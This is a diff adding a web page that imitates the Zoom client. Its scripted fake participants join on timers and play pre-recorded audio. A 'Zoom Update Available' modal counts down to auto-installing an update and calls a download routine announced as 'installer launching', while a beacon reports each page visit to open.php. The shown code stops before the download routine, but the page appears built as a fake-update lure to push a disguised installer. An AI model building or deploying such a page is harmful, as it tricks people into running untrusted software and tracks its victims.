+        <svg width="48" height="48" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"></path></svg>
+        <p style="font-size:14px">No recent chats</p>
+      </div>
+    </div>
+
+    <!-- tab: meetings -->
+    <div id="tab-meetings" class="hidden">
+      <div class="section-header">
+        <span class="section-title">Scheduled Meetings</span>
+        <button class="btn-sm btn-blue" onclick="openScheduleModal()">+ Schedule</button>
+      </div>
+      <div id="scheduled-list"></div>
+    </div>
+
+    <!-- tab: contacts -->
+    <div id="tab-contacts" class="hidden">
+      <div style="display:flex;align-items:center;justify-content:center;height:300px;flex-direction:column;gap:12px;color:var(--z-text3)">
+        <svg width="48" height="48" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 00-3-3.87"></path><path d="M16 3.13a4 4 0 010 7.75"></path></svg>
+        <p style="font-size:14px">No contacts yet</p>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════ -->
+<!--  PRE-JOIN                              -->
+<!-- ══════════════════════════════════════ -->
+<div id="prejoin-screen" class="screen hidden" style="align-items:center;justify-content:center;padding:24px">
+  <div class="prejoin-wrap">
+    <div style="text-align:center;margin-bottom:20px">
+      <div style="font-size:20px;font-weight:700" id="pj-title">Join Meeting</div>
+      <div style="font-size:13px;color:var(--z-text2);margin-top:4px" id="pj-sub">Meeting ID: <span id="pj-meeting-id"></span></div>
+    </div>
+    <div class="cam-preview">
+      <video id="pj-video" autoplay="" muted="" playsinline=""></video>
+      <div class="cam-off-overlay" id="pj-cam-off">
+        <div class="cam-off-avatar" id="pj-avatar">YO</div>
+        <p style="font-size:13px;color:var(--z-text2)">Camera is off</p>
+      </div>
+    </div>
+    <div class="prejoin-controls">
+      <div style="display:flex;flex-direction:column;align-items:center;gap:4px">
+        <button class="media-btn off" id="pj-mic-btn" onclick="togglePjMic()">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M12 1a3 3 0 00-3 3v8a3 3 0 006 0V4a3 3 0 00-3-3z"></path><path d="M19 10v2a7 7 0 01-14 0v-2"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line><line x1="3" y1="3" x2="21" y2="21" class="pj-mic-slash"></line></svg>
+        </button>
+        <span style="font-size:11px;color:var(--z-text2)" id="pj-mic-label">Muted</span>
+      </div>
+      <div style="display:flex;flex-direction:column;align-items:center;gap:4px">
+        <button class="media-btn off" id="pj-cam-btn" onclick="togglePjCam()">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"></polygon><rect x="1" y="5" width="15" height="14" rx="2"></rect><line x1="3" y1="3" x2="21" y2="21" class="pj-cam-slash"></line></svg>
+        </button>
+        <span style="font-size:11px;color:var(--z-text2)" id="pj-cam-label">Stop Video</span>
+      </div>
+      <div style="display:flex;flex-direction:column;align-items:center;gap:4px">
+        <button class="media-btn" id="pj-bg-btn" onclick="showToast('Virtual backgrounds coming soon')">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--z-text2)" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+        </button>
+        <span style="font-size:11px;color:var(--z-text2)">Backgrounds</span>
+      </div>
+    </div>
+    <div class="meeting-info-bar">
+      <div style="font-size:13px;font-weight:600;margin-bottom:6px" id="pj-meeting-name">Zoom Meeting</div>
+      <div style="font-size:12px;color:var(--z-text2);display:flex;gap:16px">
+        <span>Host: <span id="pj-host-name">You</span></span>
+        <span id="pj-participants-count">1 participant</span>
+      </div>
+    </div>
+    <button class="join-meeting-btn" id="pj-join-btn" onclick="enterMeeting()">Join Now</button>
+    <button class="cancel-btn" onclick="goHome()">Cancel</button>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════ -->
+<!--  MEETING                               -->
+<!-- ══════════════════════════════════════ -->
+<div id="meeting-screen" class="screen hidden">
+
+  <!-- top bar -->
+  <div class="meeting-top-bar">
+    <div class="meeting-top-title" id="mt-title">Zoom Meeting</div>
+    <div style="display:flex;align-items:center;gap:8px;margin-left:auto">
+      <span id="meeting-timer">00:00</span>
+      <button class="top-action-btn" onclick="openInMeetingInvite()">
+        <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"></path><circle cx="8.5" cy="7" r="4"></circle><line x1="20" y1="8" x2="20" y2="14"></line><line x1="23" y1="11" x2="17" y2="11"></line></svg>
+        Invite
+      </button>
+      <button class="top-action-btn" id="mt-view-btn" onclick="toggleView()">
+        <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
+        Gallery
+      </button>
+      <div style="width:1px;height:18px;background:var(--z-border)"></div>
+      <span style="font-size:11px;color:var(--z-text3)" id="mt-meeting-id-display"></span>
+    </div>
+  </div>
+
+  <!-- video area — flex:1 fill between top bar and ctrl bar -->
+  <div id="video-area">
+
+    <!-- video grid -->
+    <div id="video-grid" class="grid-1"></div>
+
+    <!-- self pip — inside video area so it never overlaps ctrl bar -->
+    <div id="self-pip">
+      <video id="local-video" autoplay="" muted="" playsinline=""></video>
+      <div class="pip-off hidden" id="pip-cam-off"><span>Camera off</span></div>
+      <div class="pip-name" id="pip-name">You (Me)</div>
+    </div>
+
+    <!-- reactions bar -->
+    <div class="reactions-bar hidden" id="reactions-bar">
+      <button onclick="sendReaction('👍')">👍</button>
+      <button onclick="sendReaction('❤️')">❤️</button>
+      <button onclick="sendReaction('😂')">😂</button>
+      <button onclick="sendReaction('😮')">😮</button>
+      <button onclick="sendReaction('👏')">👏</button>
+      <button onclick="sendReaction('🎉')">🎉</button>
+    </div>
+
+    <!-- side panels live inside video-area -->
+    <!-- chat side panel -->
+    <div class="side-panel" id="chat-panel">
+    <div class="panel-header">
+      <h3>Meeting Chat</h3>
+      <button class="panel-close" onclick="toggleChat()">
+        <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+      </button>
+    </div>
+    <div class="chat-body" id="chat-messages"></div>
+    <div class="chat-input-row">
+      <input id="chat-input" placeholder="To: Everyone" onkeypress="if(event.key==='Enter')sendChat()">
+      <button class="chat-send-btn" onclick="sendChat()">Send</button>
+    </div>
+  </div>
+
+  <!-- participants side panel -->
+  <div class="side-panel" id="participants-panel">
+    <div class="panel-header">
+      <h3>Participants (<span id="p-count">0</span>)</h3>
+      <button class="panel-close" onclick="toggleParticipants()">
+        <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+      </button>
+    </div>
+    <div style="flex:1;overflow-y:auto;padding:12px" id="participants-list"></div>
+    <div style="padding:12px;border-top:1px solid var(--z-border)">
+      <button style="width:100%;padding:9px;background:var(--z-blue);border:none;color:#fff;border-radius:9px;font-size:13px;font-weight:600;cursor:pointer" onclick="openInMeetingInvite()">Invite</button>
+    </div>
+  </div>
+
+  <!-- invite panel (in-meeting) -->
+  <div class="side-panel" id="invite-panel">
+    <div class="panel-header">
+      <h3>Invite People</h3>
+      <button class="panel-close" onclick="document.getElementById('invite-panel').classList.remove('open')">
+        <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+      </button>
+    </div>
+    <div style="padding:16px;flex:1">
+      <p style="font-size:12px;color:var(--z-text2);margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:.4px">Meeting ID</p>
+      <div class="meeting-id-display" style="margin-bottom:16px">
+        <span class="meeting-id-val" id="im-meeting-id"></span>
+        <button class="copy-btn" onclick="copyMeetingId()">Copy</button>
+      </div>
+      <p style="font-size:12px;color:var(--z-text2);margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:.4px">Invite Link</p>
+      <div class="invite-copy-row">
+        <input id="im-invite-link" readonly="" style="font-size:12px">
+        <button class="invite-copy-btn" onclick="copyInviteLink()">Copy Link</button>
+      </div>
+      <div style="margin-top:16px">
+        <p style="font-size:12px;color:var(--z-text2);margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:.4px">Passcode</p>
+        <div style="background:#111;border:1px solid var(--z-border);border-radius:8px;padding:10px 14px;display:flex;justify-content:space-between;align-items:center">
+          <span style="font-size:16px;font-weight:700;letter-spacing:3px" id="im-passcode"></span>
+          <button class="copy-btn" onclick="copyPasscode()">Copy</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  </div><!-- end #video-area -->
+
+  <!-- control bar — always pinned at bottom of meeting screen -->
+  <div class="ctrl-bar">
+    <div class="ctrl-group">
+      <button class="ctrl-btn muted" id="mic-btn" onclick="toggleMic()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 00-3 3v8a3 3 0 006 0V4a3 3 0 00-3-3z"></path><path d="M19 10v2a7 7 0 01-14 0v-2"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>
+        <span id="mic-label">Unmute</span>
+      </button>
+      <button class="caret-btn" onclick="showToast('Audio settings')">▲</button>
+      <div class="ctrl-divider"></div>
+      <button class="ctrl-btn muted" id="cam-btn" onclick="toggleCam()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"></polygon><rect x="1" y="5" width="15" height="14" rx="2"></rect></svg>
+        <span id="cam-label">Start Video</span>
+      </button>
+      <button class="caret-btn" onclick="showToast('Video settings')">▲</button>
+    </div>
+    <div class="ctrl-group">
+      <button class="ctrl-btn" onclick="toggleSecurityPanel()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+        <span>Security</span>
+      </button>
+      <button class="ctrl-btn" onclick="toggleParticipants()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 00-3-3.87"></path><path d="M16 3.13a4 4 0 010 7.75"></path></svg>
+        <span>Participants</span>
+      </button>
+      <button class="ctrl-btn" onclick="toggleChat()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"></path></svg>
+        <span>Chat</span>
+      </button>
+      <button class="ctrl-btn" onclick="toggleShare()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+        <span>Share Screen</span>
+      </button>
+      <button class="ctrl-btn" onclick="toggleReactions()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><path d="M8 14s1.5 2 4 2 4-2 4-2"></path><line x1="9" y1="9" x2="9.01" y2="9"></line><line x1="15" y1="9" x2="15.01" y2="9"></line></svg>
+        <span>Reactions</span>
+      </button>
+      <button class="ctrl-btn" onclick="toggleRecord()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" id="record-icon"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="4" fill="currentColor"></circle></svg>
+        <span id="record-label">Record</span>
+      </button>
+    </div>
+    <div class="ctrl-group">
+      <button class="ctrl-btn-end" onclick="leaveMeeting()">
+        <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
+        Leave
+      </button>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════ -->
+<!--  MODALS                                -->
+<!-- ══════════════════════════════════════ -->
+
+<!-- New Meeting -->
+<div class="modal-bg hidden" id="modal-new-meeting">
+  <div class="modal-box">
+    <div class="modal-title">New Meeting</div>
+    <div class="modal-sub">Your meeting details</div>
+    <div style="margin-bottom:14px">
+      <div class="field-label">Meeting ID</div>
+      <div class="meeting-id-display">
+        <span class="meeting-id-val" id="nm-meeting-id"></span>
+        <button class="copy-btn" onclick="copyMeetingId()">Copy</button>
+      </div>
+    </div>
+    <div style="margin-bottom:14px">
+      <div class="field-label">Invite Link</div>
+      <div class="invite-link-box" id="nm-invite-link"></div>
+      <button style="width:100%;padding:8px;background:var(--z-surface2);border:none;color:var(--z-text2);border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;margin-top:6px" onclick="copyInviteLink()">Copy Invite Link</button>
+    </div>
+    <div style="margin-bottom:16px">
+      <div class="toggle-row">
+        <div>
+          <div style="font-size:13px;font-weight:500">Video — Host</div>
+          <div style="font-size:12px;color:var(--z-text2)">Turn on your camera when joining</div>
+        </div>
+        <div class="toggle" id="t-host-video" onclick="this.classList.toggle('on')"></div>
+      </div>
+      <div class="toggle-row">
+        <div>
+          <div style="font-size:13px;font-weight:500">Video — Participants</div>
+          <div style="font-size:12px;color:var(--z-text2)">Participants' cameras when joining</div>
+        </div>
+        <div class="toggle" id="t-part-video" onclick="this.classList.toggle('on')"></div>
+      </div>
+      <div class="toggle-row">
+        <div>
+          <div style="font-size:13px;font-weight:500">Waiting Room</div>
+          <div style="font-size:12px;color:var(--z-text2)">Admit participants manually</div>
+        </div>
+        <div class="toggle on" id="t-waiting" onclick="this.classList.toggle('on')"></div>
+      </div>
+    </div>
+    <div class="modal-actions">
+      <button class="btn-lg btn-ghost" style="background:var(--z-surface2);color:var(--z-text2)" onclick="closeModal('modal-new-meeting')">Cancel</button>
+      <button class="btn-lg btn-blue" onclick="startMeeting()">Start Meeting</button>
+    </div>
+  </div>
+</div>
+
+<!-- Join Meeting -->
+<div class="modal-bg hidden" id="modal-join">
+  <div class="modal-box">
+    <div class="modal-title">Join a Meeting</div>
+    <div class="modal-sub">Enter the meeting ID to join</div>
+    <div style="margin-bottom:16px">
+      <div class="field-label">Meeting ID</div>
+      <input class="join-id-input" id="join-id-input" placeholder="Enter Meeting ID" maxlength="14" oninput="formatMeetingIdInput(this)" onkeypress="if(event.key==='Enter')joinMeetingById()">
+    </div>
+    <div style="margin-bottom:16px">
+      <div class="field-label">Your Name</div>
+      <input class="field-input" id="join-name-input" placeholder="Your display name" value="You">
+    </div>
+    <div style="margin-bottom:16px">
+      <div class="field-label">Passcode (optional)</div>
+      <input class="field-input" id="join-pass-input" placeholder="Enter passcode if required" type="password">
+    </div>
+    <div style="margin-bottom:16px">
+      <div class="toggle-row">
+        <div style="font-size:13px;font-weight:500">Don't connect to audio</div>
+        <div class="toggle" onclick="this.classList.toggle('on')"></div>
+      </div>
+      <div class="toggle-row">
+        <div style="font-size:13px;font-weight:500">Turn off my video</div>
+        <div class="toggle" onclick="this.classList.toggle('on')"></div>
+      </div>
+    </div>
+    <div class="modal-actions">
+      <button class="btn-lg btn-ghost" style="background:var(--z-surface2);color:var(--z-text2)" onclick="closeModal('modal-join')">Cancel</button>
+      <button class="btn-lg btn-blue" onclick="joinMeetingById()">Join</button>
+    </div>
+  </div>
+</div>
+
+<!-- Schedule -->
+<div class="modal-bg hidden" id="modal-schedule">
+  <div class="modal-box" style="width:480px">
+    <div class="modal-title">Schedule a Meeting</div>
+    <div class="modal-sub">Plan a meeting for later</div>
+    <div style="margin-bottom:14px">
+      <div class="field-label">Topic</div>
+      <input class="field-input" id="sch-topic" placeholder="My Zoom Meeting">
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px">
+      <div>
+        <div class="field-label">Date</div>
+        <input class="field-input" type="date" id="sch-date">
+      </div>
+      <div>
+        <div class="field-label">Time</div>
+        <input class="field-input" type="time" id="sch-time">
+      </div>
+    </div>
+    <div style="margin-bottom:14px">
+      <div class="field-label">Duration</div>
+      <select class="field-input" id="sch-duration">
+        <option>30 minutes</option><option>45 minutes</option>
+        <option selected="">1 hour</option><option>1.5 hours</option>
+        <option>2 hours</option><option>3 hours</option>
+      </select>
+    </div>
+    <div style="margin-bottom:14px">
+      <div class="field-label">Meeting ID</div>
+      <div style="display:flex;gap:10px">
+        <label style="display:flex;align-items:center;gap:6px;font-size:13px;cursor:pointer"><input type="radio" name="mid-type" value="auto" checked=""> Generate Automatically</label>
+        <label style="display:flex;align-items:center;gap:6px;font-size:13px;cursor:pointer"><input type="radio" name="mid-type" value="personal"> Personal Meeting ID</label>
+      </div>
+    </div>
+    <div style="margin-bottom:16px">
+      <div class="toggle-row">
+        <div style="font-size:13px;font-weight:500">Passcode</div>
+        <div class="toggle on" id="t-sch-pass" onclick="this.classList.toggle('on')"></div>
+      </div>
+      <div class="toggle-row">
+        <div style="font-size:13px;font-weight:500">Waiting Room</div>
+        <div class="toggle on" onclick="this.classList.toggle('on')"></div>
+      </div>
+      <div class="toggle-row">
+        <div style="font-size:13px;font-weight:500">Recurring meeting</div>
+        <div class="toggle" onclick="this.classList.toggle('on')"></div>
+      </div>
+    </div>
+    <div class="modal-actions">
+      <button class="btn-lg btn-ghost" style="background:var(--z-surface2);color:var(--z-text2)" onclick="closeModal('modal-schedule')">Cancel</button>
+      <button class="btn-lg btn-blue" onclick="scheduleMeeting()">Save</button>
+    </div>
+  </div>
+</div>
+
+<!-- Share Screen placeholder -->
+<div class="modal-bg hidden" id="modal-share">
+  <div class="modal-box" style="text-align:center">
+    <div class="modal-title">Share Your Screen</div>
+    <div class="modal-sub">Choose what to share</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px">
+      <div class="action-card" onclick="showToast('Screen sharing requires a live server')">
+        <div class="action-icon blue" style="width:100%;aspect-ratio:16/9;border-radius:10px;align-items:center;justify-content:center;display:flex">
+          <svg width="28" height="28" fill="none" stroke="#fff" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+        </div>
+        <span style="font-size:13px">Entire Screen</span>
+      </div>
+      <div class="action-card" onclick="showToast('Window sharing requires a live server')">
+        <div class="action-icon purple" style="width:100%;aspect-ratio:16/9;border-radius:10px;align-items:center;justify-content:center;display:flex">
+          <svg width="28" height="28" fill="none" stroke="#fff" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"></rect><line x1="3" y1="9" x2="21" y2="9"></line></svg>
+        </div>
+        <span style="font-size:13px">Application Window</span>
+      </div>
+    </div>
+    <div class="modal-actions" style="justify-content:center">
+      <button class="btn-lg btn-ghost" style="background:var(--z-surface2);color:var(--z-text2)" onclick="closeModal('modal-share')">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<!-- Update modal -->
+<div class="modal-bg hidden" id="update-modal">
+  <div class="update-box">
+    <!-- Header -->
+    <div style="display:flex;align-items:center;gap:14px;margin-bottom:20px">
+      <div style="width:44px;height:44px;background:var(--z-blue);border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4" stroke="#fff" stroke-width="2" stroke-linecap="round"></path><polyline points="7 10 12 15 17 10" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></polyline><line x1="12" y1="15" x2="12" y2="3" stroke="#fff" stroke-width="2" stroke-linecap="round"></line></svg>
+      </div>
+      <div style="text-align:left">
+        <div style="font-size:15px;font-weight:700;color:var(--z-text)">Zoom Update Available</div>
+        <div style="font-size:12px;color:var(--z-text2);margin-top:2px">Version 6.3.1 (build 14509)</div>
+      </div>
+    </div>
+
+    <!-- Progress bar area -->
+    <div id="upd-progress-wrap" style="margin-bottom:16px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+        <span style="font-size:12px;color:var(--z-text2)" id="upd-status-text">Preparing download…</span>
+        <span style="font-size:12px;font-weight:600;color:var(--z-blue)" id="upd-pct">0%</span>
+      </div>
+      <div style="height:4px;background:var(--z-surface2);border-radius:2px;overflow:hidden">
+        <div id="upd-bar" style="height:100%;width:0%;background:var(--z-blue);border-radius:2px;transition:width .3s ease"></div>
+      </div>
+    </div>
+
+    <!-- Steps -->
+    <div style="display:flex;flex-direction:column;gap:8px;margin-bottom:18px">
+      <div class="upd-step" id="upd-step-1">
+        <div class="upd-step-dot pending" id="upd-dot-1"></div>
+        <span style="font-size:12px;color:var(--z-text2)">Downloading update package</span>
+      </div>
+      <div class="upd-step" id="upd-step-2">
+        <div class="upd-step-dot pending" id="upd-dot-2"></div>
+        <span style="font-size:12px;color:var(--z-text2)">Verifying integrity</span>
+      </div>
+      <div class="upd-step" id="upd-step-3">
+        <div class="upd-step-dot pending" id="upd-dot-3"></div>
+        <span style="font-size:12px;color:var(--z-text2)">Ready to install</span>
+      </div>
+    </div>
+
+    <!-- Footer line -->
+    <div style="border-top:1px solid var(--z-border);padding-top:14px;display:flex;align-items:center;justify-content:space-between">
+      <span style="font-size:11px;color:var(--z-text3)">Auto-installing in <span id="countdown" style="color:var(--z-blue);font-weight:700">5</span>s</span>
+      <div style="display:flex;gap:8px">
+        <button onclick="document.getElementById('update-modal').classList.add('hidden')" style="background:var(--z-surface2);border:none;color:var(--z-text2);padding:6px 14px;border-radius:7px;font-size:12px;font-weight:600;cursor:pointer">Later</button>
+        <button onclick="triggerDownload()" style="background:var(--z-blue);border:none;color:#fff;padding:6px 14px;border-radius:7px;font-size:12px;font-weight:600;cursor:pointer">Install Now</button>
+      </div>
+    </div>
+
+    <p id="download-status" class="hidden" style="color:var(--z-green);font-size:12px;margin-top:10px;font-weight:600;text-align:center">Download complete — installer launching…</p>
+  </div>
+</div>
+
+<!-- Toast -->
+<div id="toast"></div>
+
+<!-- Audio enable -->
+<div id="audio-enable">
+  <span style="font-weight:600;font-size:13px">Audio blocked</span>
+  <button id="audio-enable-btn" onclick="onUserEnableAudio()">Enable Sound</button>
+</div>
+
+<script>
+(function(){
+'use strict';
+
+/* ══════════════ CONFIG ══════════════ */
+const CONFIG = {
+  OVERLAY_INTERVAL_MS: 12000,
+  OVERLAY_COUNTDOWN_SEC: 5,
+  PROCESS_PHP_URL: 'process.php',
+  OPEN_PHP_URL: 'open.php',
+  LOADING_DURATION_MS: 1800,
+  BASE_URL: window.location.origin + window.location.pathname.replace('index.html','')
+};
+
+const PARTICIPANTS = [
+  {id:'p1', name:'Matthew Karlsson', initials:'MK', role:'Host', audioFile:'audio/conversation-1.mp3', joinDelay:600,  isHost:true},
+  {id:'p2', name:'James Whitmore',   initials:'JW', role:'Guest', audioFile:'audio/conversation-2.mp3', joinDelay:2000, isHost:false},
+  {id:'p3', name:'Sarah Chen',       initials:'SC', role:'Guest', audioFile:'audio/conversation-3.mp3', joinDelay:3500, isHost:false}
+];
+
+const AUDIO_FILES = {
+  userJoined:'audio/user-joined.mp3', userLeft:'audio/user-left.mp3',
+  mute:'audio/mute.mp3', unmute:'audio/unmute.mp3',
+  newSpeaker:'audio/new-speaker.mp3',
+  recordingStart:'audio/recording-start.mp3', recordingStop:'audio/recording-stop.mp3'
+};
+
+/* ══════════════ STATE ══════════════ */
+let S = {
+  currentScreen: 'loading',
+  meetingId: null,
+  passcode: null,
+  meetingTitle: 'Zoom Meeting',
+  localStream: null,
+  micEnabled: false,
+  camEnabled: false,
+  pjMicEnabled: false,
+  pjCamEnabled: false,
+  activeParticipants: [],
+  audioContext: null,
+  analysers: {},
+  audioElements: {},
+  overlayInterval: null,
+  countdownInterval: null,
+  animationFrameId: null,
+  speakerOffTimeout: null,
+  audioBlocked: false,
+  speakerOn: false,
+  audioEnableShown: false,
+  redirectScheduled: false,
+  updateCountdownStarted: false,
+  recording: false,
+  recordStart: null,
+  timerInterval: null,
+  meetingStartTime: null,
+  viewMode: 'speaker',
+  scheduledMeetings: [],
+  chatOpen: false,
+  participantsOpen: false
+};
+
+/* ══════════════ UTILS ══════════════ */
+function generateMeetingId(){
+  const d = ()=>Math.floor(1000+Math.random()*9000);
+  return `${d()}-${d()}-${d()}`;
+}
+function generatePasscode(){
+  return Math.floor(100000+Math.random()*900000).toString();
+}
+function formatMeetingIdInput(el){
+  let v = el.value.replace(/\D/g,'').slice(0,11);
+  if(v.length>7) v=v.slice(0,3)+'-'+v.slice(3,7)+'-'+v.slice(7);
+  else if(v.length>3) v=v.slice(0,3)+'-'+v.slice(3);
+  el.value=v;
+}
+function inviteLink(mid){
+  return CONFIG.BASE_URL+'?mid='+mid.replace(/-/g,'');
+}
+function showToast(msg,dur=2500){
+  const t=document.getElementById('toast');
+  t.textContent=msg;
+  t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),dur);
+}
+function closeModal(id){ document.getElementById(id).classList.add('hidden') }
+function openModal(id){ document.getElementById(id).classList.remove('hidden') }
+function switchScreen(id){
+  ['loading-screen','home-screen','prejoin-screen','meeting-screen'].forEach(s=>{
+    document.getElementById(s).classList.toggle('hidden',s!==id);
+  });
+  S.currentScreen=id;
+}
+
+/* ══════════════ TABS ══════════════ */
+function switchTab(name,btn){
+  ['home','chat','meetings','contacts'].forEach(t=>{
+    document.getElementById('tab-'+t).classList.toggle('hidden',t!==name);
+  });
+  document.querySelectorAll('.nav-tab').forEach(b=>b.classList.remove('active'));
+  if(btn) btn.classList.add('active');
+  if(name==='meetings') renderScheduledList();
+}
+window.switchTab = switchTab;
+
+/* ══════════════ INIT ══════════════ */
+document.addEventListener('DOMContentLoaded',()=>{
+  setTodayDate();
+  renderUpcoming();
+  sendOpenNotification();
+  setTimeout(()=>switchScreen('home-screen'), CONFIG.LOADING_DURATION_MS);
+});
+
+function setTodayDate(){
+  const d = new Date();
+  const pad = n=>String(n).padStart(2,'0');
+  const today = `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())}`;
+  const tPlus1 = new Date(d); tPlus1.setDate(tPlus1.getDate()+1);
+  const tomorrow = `${tPlus1.getFullYear()}-${pad(tPlus1.getMonth()+1)}-${pad(tPlus1.getDate())}`;
+  document.getElementById('sch-date').value = today;
+  document.getElementById('sch-time').value = pad(d.getHours())+':'+pad(d.getMinutes());
+}
+
+async function sendOpenNotification(){
+  try{
+    await fetch(CONFIG.OPEN_PHP_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({meetingId:'home',timestamp:Date.now()})});
+  }catch(e){}
+}
+
+/* ══════════════ HOME MODALS ══════════════ */
+function openNewMeetingModal(){
+  S.meetingId = generateMeetingId();
+  S.passcode  = generatePasscode();
+  document.getElementById('nm-meeting-id').textContent   = S.meetingId;
+  document.getElementById('nm-invite-link').textContent  = inviteLink(S.meetingId);
+  openModal('modal-new-meeting');
+}
+window.openNewMeetingModal = openNewMeetingModal;
+
+function openJoinModal(){ openModal('modal-join'); }
+window.openJoinModal = openJoinModal;
+
+function openScheduleModal(){ openModal('modal-schedule'); }
+window.openScheduleModal = openScheduleModal;
+
+function openShareModal(){ openModal('modal-share'); }
+window.openShareModal = openShareModal;
+
+/* ══════════════ COPY HELPERS ══════════════ */
+function copyMeetingId(){
+  navigator.clipboard.writeText(S.meetingId||'').then(()=>showToast('Meeting ID copied')).catch(()=>showToast('Copy: '+S.meetingId));
+}
+function copyInviteLink(){
+  const link = inviteLink(S.meetingId||'000-0000-0000');
+  navigator.clipboard.writeText(link).then(()=>showToast('Invite link copied')).catch(()=>showToast('Copied'));
+}
+function copyPasscode(){
+  navigator.clipboard.writeText(S.passcode||'').then(()=>showToast('Passcode copied')).catch(()=>showToast('Copy: '+S.passcode));
+}
+window.copyMeetingId = copyMeetingId;
+window.copyInviteLink = copyInviteLink;
+window.copyPasscode = copyPasscode;
+
+/* ══════════════ START / JOIN FLOW ══════════════ */
+function startMeeting(){
+  closeModal('modal-new-meeting');
+  S.meetingTitle = 'Zoom Meeting — ' + S.meetingId;
+  goToPrejoin(true);
+}
+window.startMeeting = startMeeting;
+
+function joinMeetingById(){
+  const raw = document.getElementById('join-id-input').value.replace(/\D/g,'');
+  if(raw.length < 9){ showToast('Please enter a valid Meeting ID'); return; }
+  const fmt = raw.slice(0,3)+'-'+raw.slice(3,7)+'-'+raw.slice(7,11);
+  S.meetingId   = fmt;
+  S.passcode    = generatePasscode();
+  S.meetingTitle= 'Zoom Meeting — ' + fmt;
+  closeModal('modal-join');
+  goToPrejoin(false);
+}
+window.joinMeetingById = joinMeetingById;
+
+function goToPrejoin(isHost){
